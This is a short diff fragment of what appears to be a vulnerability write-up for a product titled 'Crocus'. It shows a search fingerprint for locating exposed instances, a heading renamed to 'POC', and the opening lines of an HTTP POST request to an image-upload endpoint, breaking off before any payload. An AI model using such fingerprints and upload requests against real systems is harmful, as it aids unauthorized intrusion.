@@ -5,7 +5,7 @@
 body="/ThirdResource/respond/respond.min.js" && title="Crocus"
 ```
 
-## poc
+## POC
 ```javascript
 POST /RepairRecord.do?Action=imageupload HTTP/1.1
 Host: 
